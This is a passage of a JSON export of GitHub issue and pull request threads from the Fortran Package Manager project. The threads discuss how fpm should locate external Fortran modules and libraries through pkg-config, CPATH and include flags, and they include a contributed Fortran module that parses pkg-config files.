                    "user": "arjenmarkus",
                    "date": "2021-05-04 12:47:52+00:00",
                    "text": "FYI, I wrote a small program (already some time ago in response to this ticket, but I seem to have forgotten to post it) that reads these pkgconfig files, including the substitution of macros. Maybe it is useful for fpm.\npkgconfig.f90.txt"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-27 15:06:28+00:00",
                    "text": "Since I don't intend to continue working on this pull request, I'm going to close it.\nThis branch can be resurrected from e0767b4 if needed."
                }
            ]
        },
        {
            "number": 442,
            "user": "everythingfunctional",
            "date": "2021-04-15 20:03:18+00:00",
            "title": "Use lib instead of ar on Windows",
            "text": "If ar isn't available, use lib to create static library files. Only do this check on Windows (or Unknown) systems. It's almost certainly safe to assume ar exists on all other systems.\nFix #384",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-22 14:26:26+00:00",
                    "text": "Having addressed the one comment, and with another approval, I'm going to go ahead and merge this. Hopefully it's not too difficult for #449 and #451 to incorporate this."
                }
            ]
        },
        {
            "number": 441,
            "user": "awvwgk",
            "date": "2021-04-15 14:22:16+00:00",
            "title": "Consistent module / include search paths",
            "text": "Just found this Q&A here: https://stackoverflow.com/questions/23991664/gfortran-include-path-is-there-an-alternative-to-passing-multiple-i-options\nIn summary, GFortran will not use the CPATH environment variable to resolve Fortran include or use directives, the -I flag has to be manually added with -I to the command line. In contrast, #include via the C preprocessor will use the include directories from CPATH.\nWith Intel Fortran the situation is different, include, use and #include will use the directories specified in CPATH to find include files and module files.\nFor consistency (and convenience), I would suggest we \u201cfix\u201d the GFortran behaviour by automatically adding the entries in CPATH as include directories to the compile arguments to allow the user to rely on the environment variables rather than having to use --flag.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-04-15 14:58:44+00:00",
                    "text": "Here is a patch https://github.com/awvwgk/fortran-package-manager/tree/gfortran-cpath I will propose after the external modules (#438) are merged."
                }
            ]
        },
        {
            "number": 440,
            "user": "gareth-nx",
            "date": "2021-04-15 04:57:12+00:00",
            "title": "Minor edits to README.md",
            "text": "Slight edit to the bootstrapping instructions to make clear that the code-snippet must be run from within the fpm directory to work.\nOtherwise it fails, because the code cannot find the fpm.toml file.\nWhile perhaps obvious, this confused me on my first attempt to use fpm.",
            "comments": []
        },
        {
            "number": 439,
            "user": "awvwgk",
            "date": "2021-04-12 20:32:55+00:00",
            "title": "Finding external dependencies in non-standard places",
            "text": "This is a whole can of worms. The documentation regarding the dependency() function in meson gives a nice impression on all the things one can / has to consider when dealing with dependencies.\nHow does fpm find dependencies now?\nCurrently, we assume the compiler can find external libraries and include files all by itself.\nThis works fine for system libraries, but usually there are packages under different prefixes like /opt or in the users home which could also be used, but are not included by default.\nUsing a dependency tool\nA somewhat standard way to handle non-system dependencies are pkg-config or cmake package files, some platforms might provide their own like OSX frameworks. Also some packages are known to provide incorrect package files.\nUsing environment variables\nAn third-party library usually provides a way to make itself known to the system, using environment variables like CPATH to add include directories, LIBRARY_PATH to add to the library search path and LD_LIBRARY_PATH to add to the runtime load path. This mechanism allows fpm to automatically pick up third-party dependencies by relying on the compiler.\nSetup scripts / environment modules\nSetting those variables in the first place is tricky, usually third-party libraries provide scripts which can be sourced by the shell or an environment module that can be loaded. Sometimes those scripts and modules are not working correctly as well. This is a common issue with environment modules which miss certain crucial environment variables (missing CMAKE_PREFIX_PATH is a classic).\n\nAs a developer there is nothing more painful than working in a broken environment. Either because some overzealous setup script in /etc/profile.d messes with all other packages, an environment module exports the wrong paths, or a pc file with a typo won't be recognized.\nCan we / Should we do something about this?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-13 13:36:41+00:00",
                    "text": "Thanks for opening Sebastian @awvwgk and for the detailed summary of issues;\nthis is indeed a complicated one.\nSo it seems the environment variables / environment modules approach should already work with fpm since they rely on the compiler?\nIt seems that a possible next step would be to add automatic support for pkg-config and then cmake like meson, perhaps with a syntax like:\n[dependencies]\nzlib = { external = \"zlib\" }\nwhich, like meson, attempts to find the package automatically using the supported methods.\n\nRegarding erroneous module files or pc files, I don't think there is very much that we can do in fpm to alleviate this is there?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-13 14:01:26+00:00",
                    "text": "It seems that a possible next step would be to add automatic support for pkg-config and then cmake like meson\n\nShould this be pursued directly under the roof of fpm, or deferred to the build script mechanism? In Cargo , support of pkg-config-rs, cmake, and other build tools (for C and C++ code) is provided through specific crates. These are then placed in the build-dependencies section:\n# Cargo.toml\n[build-dependencies]\ncmake = \"0.1\"\n\nPackages which rely on these tools are required to provide a build.rs script, that will typically inspect the system and figure out all the necessary flags, or even download and install missing dependencies. The idea is of course one has a access to a full programming language and not just restrictive manifest entries.\nI can see pros and cons to both approaches (pursuing something like pkg-config support directly within fpm vs deferring it to the build script mechanism)."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-16 08:32:29+00:00",
                    "text": "I can see pros and cons to both approaches (pursuing something like pkg-config support directly within fpm vs deferring it to the build script mechanism).\n\nThis is an interesting point; having thought about it, IMO I'd prefer to have direct support within fpm to simplify the user experience as much as possible."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-16 08:56:07+00:00",
                    "text": "We could probably start a separate fpm project to implement a pkg-config wrapper and use it in fpm to separate the two efforts."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-16 09:00:06+00:00",
                    "text": "Personally, I would support having pkg-config integrated directly (I mean within the manifest, the pkg-config wrapper can be in a separate git project). I have the feeling this could help cover many external dependencies already. But I don't think it is feasible to integrate support for all possible build system files (CMake, meson, scons, etc.) within fpm (at least not in the near future). Also note that pkg-config is not part of the standard MinGW installation, so Fortran users on Windows users could still find themselves with poor support.\n@milancurcic, do you have any special reasons why pkg-config was not an option for you with NetCDF support in #438?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-16 09:14:16+00:00",
                    "text": "We could probably start a separate fpm project to implement a pkg-config wrapper and use it in fpm to separate the two efforts.\n\nMaybe this gives birth to a Fortran implementation of pkg-config \ud83d\udc40. I wonder how much effort that would be (see https://gitlab.freedesktop.org/pkg-config/pkg-config, or https://github.com/pkgconf/pkgconf for C versions).\nAddendum: I've scrapped this idea already. An interface to libpkgconf sounds more reasonable. They already support Python bindings this way: https://github.com/pkgconf/pkgconf-py. A feature comparison between the original pkg-config and pkgconf is located at http://pkgconf.org/features.html\nAddendum 2: there is also a MIT-licensed Python interface to the command line pkg-config tool. Maybe it is worth looking into for a rough Fortran design."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-16 15:56:00+00:00",
                    "text": "@milancurcic, do you have any special reasons why pkg-config was not an option for you with NetCDF support in #438?\n\nIt seems to be a system misconfig. On my Ubuntu 18.10:\n$ pkg-config netcdf --cflags\n-I/usr/include/hdf5/serial\nmilan@hyperion:~$ ls /usr/include/hdf5/serial/netcdf.mod\nls: cannot access '/usr/include/hdf5/serial/netcdf.mod': No such file or directory\nmilan@hyperion:~$ locate netcdf.mod\n/home/milan/opt/netcdf-4.6.2_intel19/include/netcdf.mod\n/home/milan/opt/netcdf-fortran-4.4.4_intel19/include/netcdf.mod\n/usr/include/netcdf.mod\n\nSo, pkg-config thinks netcdf.mod is somewhere where it's not. I could do some research about pkg-config and fix the pc file, but now I'm learning another tool. I don't want that.\nSetting paths myself works just fine for me. I don't mind people adding pkg-config support into fpm, but it's not for everybody."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-16 16:02:48+00:00",
                    "text": "Back to the original question, there is another approach not mentioned: fpm could search the common system paths itself, such as /usr/include for modules, /usr/lib*/* for libraries etc (Edit: on second thought this may not be needed for linking). I don't think this is a good idea, but putting it out there."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-04-16 18:00:39+00:00",
                    "text": "Well, I experimented with finding and reading the PC files and found it was\nnot all that difficult. At least in this quick-and-dirty implementation.\nFor actual use in fpm it will have to be made more robust, but I tested it\nin Cygwin with gfortran and in plain Windows with Intel Fortran oneAPI\n(explicitly setting PKG_CONFIG_PATH) and it produced the value I expected.\nThe code is in the attachment.\n\nOp vr 16 apr. 2021 om 18:03 schreef Milan Curcic ***@***.***>:\n Back to the original question, there is another approach not mentioned:\n fpm could search the common system paths itself, such as /usr/include for\n modules, /usr/lib*/* for libraries etc. I don't think this is a good\n idea, but putting it out there.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#439 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR4VFQUFVZRPPN4FQD3TJBNTVANCNFSM42Z75IHQ>\n .\n\n! pkgconfig.f90 --\n!     Limited implementation of a \"pkg-config\" module\n!     Limitations:\n!     - It looks for particular keywords, no translation as pkg-config does\n!     - On Windows, no examination of the registry\n!     - It reads the file on every invocation of pkgconfig_get\n!\nmodule pkgconfig\n    implicit none\n\n    private\n    public :: pkgconfig_exists, pkgconfig_get\n\ncontains\n\n! pkgconfig_exists --\n!     Check if the required PC file can be found or not\n!\n! Arguments:\n!     pkgname      Name of the package\n!\n! Result:\n!     True if a PC file is found, false otherwise\n!\nlogical function pkgconfig_exists( pkgname )\n    character(len=*), intent(in) :: pkgname\n\n    integer                      :: lufile\n\n    call pkgconfig_open( pkgname, lufile, pkgconfig_exists )\n\n    if ( pkgconfig_exists ) then\n        close( lufile )\n    endif\n\nend function pkgconfig_exists\n\n! pkgconfig_open --\n!     Open the PC file for reading\n!\n! Arguments:\n!     pkgname        Name of the package\n!     lufile         LU-number for the opened file\n!     exists         Whether the PC file exists and could be opened or not\n!\nsubroutine pkgconfig_open( pkgname, lufile, exists )\n    character(len=*), intent(in) :: pkgname\n    integer, intent(out)         :: lufile\n    logical, intent(out)         :: exists\n\n    character(len=200)           :: pcpath, curpath\n    integer                      :: ierr, k, status\n\n    exists = .false.\n\n    call get_environment_variable( 'PKG_CONFIG_PATH', pcpath, status = status )\n\n    if ( status == 0 ) then\n        do while ( pcpath /= ' ' )\n            k = index( pcpath, ':' )\n            if ( k == 0 ) then\n                k = index( pcpath, ';' )\n            endif\n            !\n            ! Windows typically uses \"c:\" for the drive, very short directory names are unlikely ...\n            !\n            if ( k > 2 ) then\n                curpath = pcpath(1:k-1)\n                pcpath  = pcpath(k+1:)\n            else\n                curpath = pcpath\n                pcpath  = ' '\n            endif\n\n            open( newunit = lufile, file = trim(curpath) // '/' // trim(pkgname) // '.pc', status = 'old', iostat = ierr )\n\n            if ( ierr == 0 ) then\n                exists = .true.\n                exit\n            endif\n        enddo\n    endif\n\nend subroutine pkgconfig_open\n\n! pkgconfig_get_raw --\n!     Read the value of a variable from the PC file\n!\n! Arguments:\n!     lufile         LU-number for the opened file\n!     variable       Name of the variable\n!     value          Value as found n the PC file\n!\nsubroutine pkgconfig_get_raw( lufile, variable, value )\n    integer, intent(in)           :: lufile\n    character(len=*), intent(in)  :: variable\n    character(len=*), intent(out) :: value\n\n    character(len=200)            :: line\n    integer                       :: ierr, k\n    character(len=1)              :: delim\n\n    rewind( lufile )\n\n    value = ' '\n\n    do\n        read( lufile, '(a)', iostat = ierr ) line\n\n        if ( ierr /= 0 ) then\n            exit\n        endif\n\n        k     = index( line, trim(variable) // ':' )\n        delim = ':'\n        if ( k == 0 ) then\n            k     = index( line, trim(variable) // '=' )\n            delim = '='\n        endif\n\n        if ( k == 1 ) then\n            k     = index( line, delim )\n\n            value = adjustl( line(k+1:) )\n            exit\n        endif\n    enddo\n\nend subroutine pkgconfig_get_raw\n\n! pkgconfig_get --\n!     Read the PC file and return the (expanded) value of the requested variable\n!\n! Arguments:\n!     pkgname        Name of the package\n!     variable       Name of the variable to be found\n!\n! Result:\n!     Character string found in the PC file. If the name does not exist, then an empty string is returned\n!\n! Limitation:\n!     Maximum length is 200\n!\nfunction pkgconfig_get( pkgname, variable )\n    character(len=*), intent(in) :: pkgname\n    character(len=*), intent(in) :: variable\n\n    character(len=200)           :: pkgconfig_get, value, newvariable\n    integer                      :: lufile, k, kend\n    logical                      :: exists\n\n    pkgconfig_get = ' '\n\n    call pkgconfig_open( pkgname, lufile, exists )\n    if ( .not. exists ) then\n        return\n    endif\n\n    call pkgconfig_get_raw( lufile, variable, value )\n    if ( value == ' ' ) then\n        return\n    endif\n\n    !\n    ! Is substitution required?\n    !\n    pkgconfig_get = value\n\n    do\n        k = index( pkgconfig_get, '${' )\n\n        if ( k == 0 ) then\n            exit\n        else\n            kend        = index( pkgconfig_get, '}' )\n            newvariable = pkgconfig_get(k+2:kend-1)\n            call pkgconfig_get_raw( lufile, newvariable, value )\n\n            pkgconfig_get = pkgconfig_get(1:k-1) // trim(value) // pkgconfig_get(kend+1:)\n        endif\n    enddo\n\n    close( lufile )\n\nend function pkgconfig_get\n\n\n\nend module pkgconfig\n\n! test --\n!     Test the above code\n!\nprogram test_pkgconfig\n    use pkgconfig\n\n    implicit none\n\n    character(len=200) :: libs\n\n    if ( pkgconfig_exists( 'x11' ) ) then\n        write(*,*) 'Found: x11'\n    else\n        write(*,*) 'NOT found: x11'\n    endif\n\n    libs = pkgconfig_get( 'x11', 'Libs' )\n    write(*,*) 'LIBS: ', libs\n\nend program test_pkgconfig"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-16 21:31:30+00:00",
                    "text": "So, pkg-config thinks netcdf.mod is somewhere where it's not. I could do some research about pkg-config and fix the pc file, but now I'm learning another tool. I don't want that.\n\nMy guess is that the neither /home/milan/opt/netcdf-4.6.2_intel19/lib*/pkgconfig nor /home/milan/opt/netcdf-fortran-4.4.4_intel19/lib*/pkgconfig are actually present in the PKG_CONFIG_PATH environment variable, but you have a system installation of netcdf which is always found if no custom search path is provided.\nThis kinda goes back to the original problem, you have an installation, but no mean to tell your system that you want to use it. Installing outside of a package or environment manager leaves this job to the user, which is plain annoying. My personal solution to this problem is a local environment module setup to manage Fortran libraries for all the different compilers I want to use, writing module files is a bit tedious but it served my needs perfectly so far.\nProjects like spack and EasyBuild seem to be the next logical step to get a handle on this issue, but those always seemed like overkill for my local development machine."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-16 21:45:49+00:00",
                    "text": "but you have a system installation of netcdf which is always found if no custom search path is provided.\n\n/usr/include/netcdf.mod is not found unless I specify the path to the compiler. I don't think my custom builds under opt/ are relevant here."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-16 22:14:40+00:00",
                    "text": "I think this issue might be related to #441, it is really disappointing to find that GFortran indeed doesn't use any include path by default to search for module files (just checked locally). Additionally, pkg-config is smart enough to drop all include paths and library paths which are already part of the system paths (including values in CPATH and LIBRARY_PATH), unless it is told otherwise with --keep-system-cflags.\nThat said, it would probably be easier to use a non-system netcdf with GFortran than using a system installation in this setup. Sounds truly broken to me."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-16 22:28:33+00:00",
                    "text": "Let's call it a long-standing bug in GFortran (since 4.3.0): https://gcc.gnu.org/bugzilla/show_bug.cgi?id=35707"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-16 22:38:38+00:00",
                    "text": "@awvwgk yes, exactly, and there is a pkg-config misconfig on my system (off the shelf from apt, I didn't touch it). Pkg-config shouldn't think by default that netcdf is in a directory it is not."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 07:22:58+00:00",
                    "text": "there is a pkg-config misconfig on my system\n\nI don't think it is misconfigured, it just requires HDF5 and since only HDF5 is in a non-system path it is shown as cflags. Try pkg-config netcdf --keep-system-cflags --cflags (only works for pkgconf, unfortunately). It is just that the default behaviour of pkg-config that doesn't work together with the bug in GFortran."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 09:26:13+00:00",
                    "text": "How does fpm find dependencies now?\nCurrently, we assume the compiler can find external libraries and include files all by itself.\n\nTurns out that my initial premise was actually wrong, but if we have to drop this assumption, how can we even build a sane model for dealing with external dependencies?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-17 10:06:23+00:00",
                    "text": "If I understand correctly, the only issue is with trying to use third-party .mod files. It is worth noting that the linked gfortran bug was initially marked as WONFIX because the developers didn't want to encourage library developers to rely on distributing .mod files.\n\n... how can we even build a sane model for dealing with external dependencies?\n\nMy opinion on this is that in the short term we should provide an environment variable that allows specifying include directories to fpm for existing pre-built .mod files, and in the long term we encourage/help developers to provide proper module interfaces for their libraries that can be distributed as fpm packages."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-17 15:53:50+00:00",
                    "text": "It is just that the default behaviour of pkg-config that doesn't work together with the bug in GFortran.\n\nWhich takes us back to the bottom line and my original point. pkg-config does not generally and universally work for finding modules."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-17 15:57:11+00:00",
                    "text": "Same behavior with pkg-config on Ubuntu 20.04:\n$ pkg-config netcdf --cflags\n-I/usr/include/hdf5/serial\n\nnc-config gives the correct answer (and it always had, from my experience):\n$ nc-config --cflags\n-I/usr/include -I/usr/include/hdf5/serial"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-17 16:21:40+00:00",
                    "text": "How do we move forward from here? nc-config is an unique feature of netcdf, to use it with fpm we would require a custom build script unless we would hardwire this as special case in fpm."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-18 01:17:26+00:00",
                    "text": "Right, I mentioned nc-config only as an easy way for users to find their NetCDF paths. I don't recommend even considering to shoe-horn it into fpm.\nTo be clear, I don't not support using pkg-config in fpm. I'm not experienced with it, and I trust you and others that it may be a good solution. But it would be important to let users specify paths explicitly if needed, in case fpm is not finding a module that exists, or it's finding the wrong one. I think this is in line with your wonderful comment elsewhere that went something like, \"nothing more frustrating than a smart feature that doesn't work and can't be overriden\".\nFor now, without better answer, I recommend that we:\n\nDo nothing special about this. Simply let users know in the docs that they are responsible to provide the paths.\nMake it as easy as possible for users to provide the paths.\n\nFor point 2, I think #444 is a great step forward. In addition, we can consider to automatically add system paths like /usr/include and /usr/local/include by default, but there should be a way for the user to disable this (e.g. --no-system-cflags or similar).\nThen we wait and listen to the users. If there are many reports that say \"we want fpm to automatically find external modules\", then we consider a smarter solution."
                },
                {
                    "user": "brocolis",
                    "date": "2021-04-20 01:38:47+00:00",
                    "text": "Back to the original question, there is another approach not mentioned: fpm could search the common system paths itself, such as /usr/include for modules, /usr/lib*/* for libraries etc (Edit: on second thought this may not be needed for linking). I don't think this is a good idea, but putting it out there.\n\nI think this is a good idea. We can combine all the ideas in here into a subcommand, fpm-find module(s) [compiler] [arch]. It will do whatever is necessary to find the correct modules and report back to fpm. fpm can save the results to cache.toml."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-20 09:30:44+00:00",
                    "text": "Thanks Carlos for your perspective.\nIt would be great to have a few more opinions on this whole topic.\ncc @nncarlson @vmagnin @scivision @WardF @marshallward @everythingfunctional"
                },
                {
                    "user": "scivision",
                    "date": "2021-04-20 12:31:58+00:00",
                    "text": "I have experience with this as a maintainer of Meson and a regular contributor to CMake. In general some custom logic is needed. However, pkg-config often works. There are packages that distribute broken CMake config files and broken pkgconfig files. There are even packages with their own special config scripts like HDF5 that are broken on certain platforms. I have found no one universal solution, and that's why you'll see I've created custom logic in Meson and CMake for packages like HDF5, NetCDF, and MPI, that are the most common offenders for needing custom find logic in the build system.\nIn short I would be in support of using pkgconfig. But there will need to be custom fpm internal logic for some popular packages as noted above, paradoxically."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-20 16:44:18+00:00",
                    "text": "Back to the original question, there is another approach not mentioned: fpm could search the common system paths itself, such as /usr/include for modules, /usr/lib*/* for libraries etc (Edit: on second thought this may not be needed for linking). I don't think this is a good idea, but putting it out there.\n\nI think this is a good idea. We can combine all the ideas in here into a subcommand, fpm-find module(s) [compiler] [arch]. It will do whatever is necessary to find the correct modules and report back to fpm. fpm can save the results to cache.toml.\n\nIn a way this is similar to the suggestion from Brad in #444 (comment):\n\nAlso, given the (relatively) small number of external packages that may need to be supported this way, should they be supported as \"features\" that are on for a package that needs them, and users have a config file (maybe $HOME/.config/fpm.toml) that specifies where the installation resides for a given compiler? That seems like the easiest system for users to maintain."
                },
                {
                    "user": "rouson",
                    "date": "2021-05-17 06:04:03+00:00",
                    "text": "Any updates on this a plan for resolving this issue?  I like the idea of a subcommand fpm-find module(s) [compiler] [arch].\nI'm converting an application from cmake to fpm.   The application contains a use netcdf statement so I used homebrew to install netcdf  on macOS, which installed /usr/local/Cellar/netcdf/4.8.0_1/include/netcdf.mod.  How can I tell fpm where to search for netcdf.mod?"
                },
                {
                    "user": "rouson",
                    "date": "2021-05-17 06:20:16+00:00",
                    "text": "I tried\n \u00b1 fpm build --flag -J/usr/local/Cellar/netcdf/4.8.0_1/include/  \n + mkdir -p build/gfortran_2B85EFB7FAF749F9/icar\n + gfortran -c ./src/constants/icar_constants.f90 -J/usr/local/Cellar/netcdf/4.8.0_1/include/ -J build/gfortran_2B85EFB7FAF749F9/icar -I build/gfortran_2B85EFB7FAF749F9/icar  -o build/gfortran_2B85EFB7FAF749F9/icar/src_constants_icar_constants.f90.o\nf951: Fatal Error: gfortran: Only one '-J' option allowed\ncompilation terminated.\n Command failed\nERROR STOP"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-05-17 06:48:49+00:00",
                    "text": "I tried\n \u00b1 fpm build --flag -J/usr/local/Cellar/netcdf/4.8.0_1/include/  \n + mkdir -p build/gfortran_2B85EFB7FAF749F9/icar\n + gfortran -c ./src/constants/icar_constants.f90 -J/usr/local/Cellar/netcdf/4.8.0_1/include/ -J build/gfortran_2B85EFB7FAF749F9/icar -I build/gfortran_2B85EFB7FAF749F9/icar  -o build/gfortran_2B85EFB7FAF749F9/icar/src_constants_icar_constants.f90.o\nf951: Fatal Error: gfortran: Only one '-J' option allowed\ncompilation terminated.\n Command failed\nERROR STOP \n\n\ntry -I instead of -J."
                },
                {
                    "user": "LKedward",
                    "date": "2021-05-17 07:31:31+00:00",
                    "text": "@rouson, for netcdf you may want to try my netcfd-interfaces fpm package for a compiler-independent solution. I have not tested it on MacOS, but as long as you can link against the NetCDF library, then the package should work as an alternative to needing to find the corresponding .mod file."
                }
            ]
        },
        {
            "number": 438,
            "user": "LKedward",
            "date": "2021-04-12 15:56:00+00:00",
            "title": "Add: external-modules key to build table for non-fpm modules",
            "text": "Resolves #405 by allowing external modules to be specified in the manifest.\ne.g.\n[build]\nexternal-modules = \"netcdff\"\nSee also: #377 (comment), fortran-lang/fpm-registry#39 (comment)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-04-12 16:51:58+00:00",
                    "text": "This feature is a game changer for me, thanks a lot for implementing it.\nHow to specify the include path in which to search for modules? Is it in manifest, for example\n[library]\ninclude-dir = \"/opt/netcdf-fortran/include\"\n\nOr do I need to pass -I/opt/netcdf-fortran/include as flags on the command line?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-12 17:09:07+00:00",
                    "text": "Absolute paths should never enter the package manifest. For netcdf-fortran, there should be a way to find it with pkg-config using\npkg-config netcdf-fortran --cflags\n\nFor the time being, --flag \"$(pkg-config netcdf-fortran --cflags)\" would work, but eventually fpm must support something like pkg-config to find (external) dependencies."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-12 19:38:26+00:00",
                    "text": "Absolute paths should never enter the package manifest.\n\nWhy? That's quite a strong statement. Assume that I don't share my manifest and that pkg-config doesn't work for me. What's my next best solution?\nIt's a different question whether absolute paths should appear in manifests that are meant to be distributed (I agree that the answer is no).\nPassing a path via --flag is okay, though not as convenient in the long run as it is to be able to set it in a file and not worry about it when building."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-12 20:04:47+00:00",
                    "text": "I fear we are derailing this thread towards build system design questions. Let's discuss this at #439."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-13 13:57:28+00:00",
                    "text": "Yes, using include-dir should work for non-distributable projects and --flag I... is currently the best distributable option but is unfortunately very verbose (don't forget you also have to specify --profile if you want default profile flags when using --flag). It's a shame there isn't an compiler environment variable that could be set for specifying Fortran mod locations; perhaps an fpm environment variable instead? Otherwise providing in-built support for pkg-config or cmake (#439) seems like the only option.\n\nAside: I do wonder how much work it would be to just write an fpm package with module interfaces for these system-installed libraries?"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-13 14:40:49+00:00",
                    "text": "I just played with it and was able to compile and run (using --flag), with a caveat: I can only run if I specify all the flags on the CLI:\nLIBRARY_PATH=$NETCDFLIB fpm build --flag \"-I$NETCDFINC -fcoarray=single\"\nLIBRARY_PATH=$NETCDFLIB fpm run --flag \"-I$NETCDFINC -fcoarray=single\"\n\nHowever, if I do just fpm run (as I naively expected should work), fpm begins a new build under a new unique hash profile (I assume because the flags have changed). I also couldn't set the specific build hash as the profile. But that's for another issue and not related to this PR.\n\nYes, using include-dir should work for non-distributable projects\n\nDo you mean that this should work now with this PR, or just that you support it working in the future? I tried it and it didn't seem to make a difference."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-13 15:00:46+00:00",
                    "text": "However, if I do just fpm run (as I naively expected should work), fpm begins a new build under a new unique hash profile (I assume because the flags have changed).\n\nYes this has always been the case (since Haskell fpm) because each invocation of fpm should be independent of previous ones (stateless). The situation for command line flags will be improved somewhat with response file support coming in #364.\n\nDo you mean that this should work now with this PR, or just that you support it working in the future? I tried it and it didn't seem to make a difference.\n\nYes it should work with this PR as is because include-dir just adds to the compiler flags."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-14 13:50:50+00:00",
                    "text": "Yes it should work with this PR as is because include-dir just adds to the compiler flags.\n\nHmm, I just tried it again and can't seem to get it to work:\n$ tree .\n.\n\u251c\u2500\u2500 app\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main.f90\n\u2514\u2500\u2500 fpm.toml\n\n1 directory, 2 files\n$ cat app/main.f90 \nuse netcdf\nend\n$ cat fpm.toml \nname = \"test-include-dir\"\n\n[build]\nexternal-modules = \"netcdf\"\n\n[library]\ninclude-dir = \"/usr/include\"\n$ which fpm\n/home/milan/.local/bin/fpm\n$ fpm-ext-mod build\n + mkdir -p build/dependencies\n + mkdir -p build/gfortran_2A42023B310FA28D/test-include-dir\n + gfortran -c app/main.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/test-include-dir -I build/gfortran_2A42023B310FA28D/test-include-dir -o build/gfortran_2A42023B310FA28D/test-include-dir/app_main.f90.o\napp/main.f90:1:4:\n\n use netcdf\n    1\nFatal Error: Can't open module file \u2018netcdf.mod\u2019 for reading at (1): No such file or directory\ncompilation terminated.\n...\n\nDo you know what I'm doing incorrectly?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-14 14:15:00+00:00",
                    "text": "Do you know what I'm doing incorrectly?\n\nApologies, I forgot that include-dir is specified as a path relative to the project top-level directory; so the absolute path doesn't work here since fpm can't find it in the project directory."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-14 16:39:17+00:00",
                    "text": "Okay, that's great to know. I often make dependency links inside project directories, so this works well for me.\nThe error message should be improved, or perhaps just detect and error out if a path is absolute. I'll open a separate issue or PR for this."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-16 10:13:40+00:00",
                    "text": "Thanks for reviewing everyone. I'll merge later today if there are no more comments."
                },
                {
                    "user": "Carltoffel",
                    "date": "2021-04-30 14:58:03+00:00",
                    "text": "Thank you for this feature!\nI'm not done yet to make it work, but I'm confident I will make it.\nI had problems figuring out how to use the external-module key, as I was using the prebuild binary in which this feature is not included yet. I know it is still a very experimental project, but maybe it would be a good thing, to keep the documentation somehow consistent with the published binary. Maybe use milestones or mention the target release in the documentation.\nI am still very new to this project, but maybe you can help to me get involved. For example I could help to improve the experience for new users, because I am still fresh and don't have organisational blindness (yet).\nAlso, I found a incomplete comment: The external-module key is not mentioned in the possible fields in the build.f90"
                },
                {
                    "user": "LKedward",
                    "date": "2021-05-01 09:03:33+00:00",
                    "text": "Many thanks for the feedback @Carltoffel. It definitely helps to get a fresh pair of eyes from a user perspective and you raise a good point. This may perhaps be good motivation to start using a separate development branch so that the default branch remains 'in sync' with the current release. Do feel free to open issues and pull requests if you have ideas for how to improve the documentation."
                }
            ]
        },
        {
            "number": 437,
            "user": "LKedward",
            "date": "2021-04-10 19:37:37+00:00",
            "title": "Remove: coarray single from default Intel flags.",
            "text": "I just had an unexpected error with the most recent fpm version and then noticed that #431 added -coarray=single back into the default Intel flags (removed in #300). This PR removes it again.",
            "comments": []
        },
        {
            "number": 434,
            "user": "sgeard",
            "date": "2021-04-10 10:31:36+00:00",
            "title": "Build failure with submodules",
